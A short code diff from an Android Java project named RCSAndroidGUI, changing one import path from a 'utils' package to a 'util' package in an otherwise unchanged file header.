@@ -14,7 +14,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Manager;
 import com.ht.RCSAndroidGUI.Status;
-import com.ht.RCSAndroidGUI.utils.Check;
+import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
